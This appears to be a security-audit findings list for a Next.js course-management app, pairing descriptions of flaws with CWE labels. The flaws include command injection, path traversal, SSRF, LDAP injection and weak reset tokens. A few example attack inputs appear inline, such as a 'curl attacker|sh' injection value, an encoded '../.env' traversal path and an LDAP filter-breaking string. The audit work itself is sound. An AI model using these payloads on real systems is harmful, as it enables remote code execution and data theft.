extra.message: convertResourceFormat() interpolates the user-controlled sourcePath and format arguments directly into a shell string passed to execSync (pandoc ${sourcePath} --to=${format} -o ${outputPath}). An authenticated instructor/TA can reach this via POST /api/instructor/resources/convert and inject arbitrary OS commands (e.g. a sourcePath of 'x; curl attacker|sh') resulting in remote code execution on the server. Note format is not whitelisted here (only exportRubricDocument whitelists).

cwe: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

extra.message: The download handler builds a filesystem path with join(process.cwd(), UPLOAD_DIR, params.category, params.filename) and reads it with no containment check. Next.js URL-decodes route params, so a request such as /api/download/x/..%2F..%2F.env makes params.filename become '../../.env' and readFile returns arbitrary server files (.env, package.json, DB config). The endpoint only checks that a user is logged in - there is no per-file authorization, so any authenticated student can also read any other user's submission files or instructor materials whose path is known.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: GET /api/instructor/resources/rubric-export reads a file whose full path comes straight from the caller-controlled outputPath query parameter: const buffer = await readFile(outputPath). There is no validation that outputPath points into the rubrics directory, so any instructor or TA can read arbitrary files readable by the process (e.g. ../../.env), a classic arbitrary file read / path traversal.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: storeGeneralAttachment() takes the 'category' field straight from multipart form data and builds a write destination with join(process.cwd(), UPLOAD_DIR, category, filename) after mkdir(..., category). category is never validated, so any authenticated user posting to /api/upload can supply a value such as '../../public' and write an attacker-controlled file outside the upload directory (arbitrary file write / path traversal), potentially placing HTML/JS into a web-served directory or overwriting application files.

extra.message: importExternalResourceMetadata() performs fetch(sourceUrl) where sourceUrl is supplied by the caller (POST /api/instructor/resources with body.sourceUrl). No SSRF protection exists here - unlike webhook-dispatch.ts - so an instructor/TA can make the server request arbitrary internal addresses (cloud metadata 169.254.169.254, internal admin panels, localhost services) and the first 280 chars of the response are stored/echoed as a resource excerpt, enabling internal network probing and data exfiltration.

cwe: CWE-918: Server-Side Request Forgery (SSRF)

extra.message: findStaffByEmail() builds an LDAP filter as `(mail=${email})` without escaping the caller-supplied email (POST /api/instructor/courses), unlike verifyDepartmentMembership() which escapes. A crafted email such as '*)(cn=*))(|(mail=*' reshapes the directory search filter (LDAP injection, CWE-90), letting an attacker extract directory entries (names, emails, departments) beyond the intended lookup.

cwe: CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')

extra.message: confirmPasswordReset() only rejects a reset token when the record is missing or already used - it never compares record.expiresAt against the current time, so an expired password-reset link remains valid indefinitely. Anyone who obtains a previously issued but unused reset link (leaked email, old browser history, captured token) can reset the victim's password at any later time and is then signed into the victim's account automatically.

cwe: CWE-613: Insufficient Session Expiration
CWE-287: Improper Authentication

extra.message: Password-reset links are generated with Math.random().toString(36).substring(2, 20) instead of a cryptographically secure RNG (crypto.randomBytes is used elsewhere in this file for invite links). Math.random is predictable and not designed for security; a reset token is a single-factor account-recovery capability, so a weak PRNG makes token guessing/brute-force practical and enables account takeover.

cwe: CWE-330: Use of Insufficiently Random Values

extra.message: When an admin creates a user without specifying a password, the initial password is derived from Math.random().toString(36).slice(-12) + 'Aa1!' (same pattern in src/app/api/admin/import/users/route.ts:62 for CSV imports). Math.random is a non-cryptographic PRNG, so these generated credentials are guessable/forcible, and the account is created with a predictable default password.

cwe: CWE-330: Use of Insufficiently Random Values

extra.message: recordRejectedResetSubmission(body) writes the entire request body to the application log with console.warn('Reset-password submission rejected:', body). POST /api/auth/reset-password/confirm passes the full parsed JSON body (which contains the plaintext new password plus the reset token) into this function when validation fails, leaking credentials/tokens into logs (sensitive data exposure).

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: pushEnrollmentsToSis() places the admin-supplied integration bearer token directly into the query string of the sync URL (?token=${integrationToken}) and sends it to SIS_BASE_URL, whose fallback is plaintext http://sis.internal.example.com. Tokens embedded in URLs can leak through logs, proxy/referrer headers and browser history, and the default transport is unencrypted HTTP - exposing the SIS credential on the wire.

cwe: CWE-598: Use of GET Request Method With Sensitive Query Strings
CWE-319: Cleartext Transmission of Sensitive Information

extra.message: resolveSubmissionReturnDestination() echoes the caller-controlled 'x-redirect-url' header back verbatim with no allow-list (contrast resolveCoursePreviewReturnDestination which restricts to ALLOWED_PREVIEW_RETURNS). The value is returned to the student submission form (src/app/student/assignments/[id]/submission-form.tsx:34-51), which reads a 'returnTo' URL query parameter, forwards it as that header, then calls router.push(data.returnTo) on the echoed value. An attacker can craft a link to an assignment with ?returnTo=https://evil.example so that after a victim submits, the app navigates them to an attacker-controlled site (open redirect / client-side phishing).

cwe: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

extra.message: POST /api/discussions inserts a thread with an arbitrary body.courseId without verifying the caller can access that course (canAccessCourse is only enforced on the GET path). Similarly src/app/api/discussions/comments/route.ts POSTs a comment to any threadId with no course-membership check. Any authenticated user - including a student who is not enrolled - can create threads and comment inside courses they have no access to, and can read any thread by id (discussion detail page performs no access check).

cwe: CWE-862: Missing Authorization
CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: The student-facing assignment page shows Grade & Feedback whenever a submission's status is 'graded' OR 'released'. In the grading flow (src/app/api/instructor/grades/route.ts:73-86) a grade saved with releaseToStudent=false is given status 'graded', i.e. 'graded' means the grade has NOT yet been released to the student. Because this condition includes 'graded', a student can see points/percentage/comment for draft grades that the instructor intentionally has not released yet - premature disclosure of unreleased grade information.

cwe: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

extra.message: createCourseResourceEntry() (POST /api/instructor/resources) lets any instructor or TA create a resource row, cache a note file, and trigger a metadata fetch for an arbitrary courseId without verifying the user actually teaches that course (canTeachCourse is checked in attachCourseMaterialFile() at line 130 but NOT here). An instructor can therefore inject resources/notes/content into courses they do not teach.

extra.message: The iron-session cookie password falls back to a hardcoded, publicly-known value 'complex_password_at_least_32_characters_long_for_security' when SESSION_SECRET is not set. iron-session cookies are signed+encrypted with this password; if the env var is ever missing in a deployment, anyone knowing this constant can forge a valid lms_session cookie for an arbitrary user id/role and bypass authentication entirely.

extra.message: requestPasswordReset() returns HTTP 404 with 'No account found with that email' when the email is unknown and 403 'This account has been deactivated' for disabled accounts, while returning success for valid active accounts. This lets an unauthenticated attacker enumerate registered email addresses and learn account activation status.
